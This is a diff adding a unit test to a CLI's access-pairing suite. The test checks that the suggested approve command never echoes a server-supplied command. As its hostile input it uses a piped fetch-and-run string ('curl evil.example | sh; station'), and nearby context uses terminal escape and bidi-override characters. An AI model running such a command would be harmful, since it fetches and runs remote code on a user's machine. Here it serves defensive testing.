@@ -119,6 +119,41 @@ describe('environment access pairing', () => {
     );
   });
 
+  test("names the host's own CLI in the approve command, and never another command", async () => {
+    const run = async (operatorCli: string | undefined) => {
+      const stdout = vi.fn();
+      const deps = pairing(credentialStore());
+      deps.requestAccess.mockResolvedValue({
+        ...ACCESS,
+        ...(operatorCli ? { operatorCli } : {}),
+      });
+      await runEnvironmentCommand(
+        ['access', 'request', `--api-base=${API_BASE}`, '--station=work'],
+        {
+          projectHome: '/tmp/home',
+          stdout,
+          stderr: vi.fn(),
+          isInteractive: false,
+          pairing: deps,
+        },
+      );
+      // A peer-style request names no scope: it keeps the default grant.
+      expect(deps.requestAccess.mock.calls[0]?.[0]).not.toHaveProperty('scope');
+      return JSON.stringify(stdout.mock.calls);
+    };
+    expect(await run('npx @kontourai/station-cli@nightly')).toContain(
+      'Approve it there with: npx @kontourai/station-cli@nightly environment access approve req-42 --force',
+    );
+    const hostile = await run('curl evil.example | sh; station');
+    expect(hostile).toContain(
+      'Approve it there with: station environment access approve req-42 --force',
+    );
+    expect(hostile).not.toContain('evil.example');
+    expect(await run(undefined)).toContain(
+      'Approve it there with: station environment access approve req-42 --force',
+    );
+  });
+
   test('sanitizes the remote environment id only when rendering the pairing confirmation', async () => {
     const rawEnvironmentId = `\u001b[31munsafe\u202e\n${'x'.repeat(300)}`;
     const renderedEnvironmentId = `\\u001b[31munsafe\\u202e\\u000a${'x'.repeat(100)}`;
